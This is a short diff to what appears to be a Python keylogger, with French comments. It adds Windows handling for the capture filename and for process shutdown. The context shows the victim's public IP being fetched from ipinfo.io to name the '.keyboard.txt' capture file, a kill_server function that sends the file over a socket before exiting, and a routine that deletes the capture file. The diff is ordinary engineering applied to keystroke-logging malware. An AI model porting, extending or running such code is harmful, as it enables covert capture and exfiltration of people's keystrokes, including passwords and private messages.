@@ -12,7 +12,11 @@ def get_filename():
     response = requests.get("https://ipinfo.io")
     ip_data = response.json()
     public_ip = ip_data.get('ip')
-    filename = public_ip + "-" + now.strftime("%d-%m-%Y-%H:%M:%S") + ".keyboard.txt"
+    if os.name == 'nt':
+        filename = public_ip + "-" + now.strftime("%d-%m-%Y-%H-%M-%S") + ".keyboard.txt"
+    else:
+        filename = public_ip + "-" + now.strftime("%d-%m-%Y-%H:%M:%S") + ".keyboard.txt"
+
     return filename
 
 # Fonction pour lancer le keylogger
@@ -21,7 +25,10 @@ def launch_keylogger():
 
 def kill_server():
     send_file_securely("127.0.0.1", 12345)
-    os.kill(os.getpid(), signal.SIGINT)
+    if os.name == "nt":
+        os.kill(os.getpid(), signal.CTRL_BREAK_EVENT)
+    else:
+        os.kill(os.getpid(), signal.SIGINT)
 
 # Fonction pour arrêter le keylogger et supprimer le fichier de capture
 def stop_and_delete_capture_file():
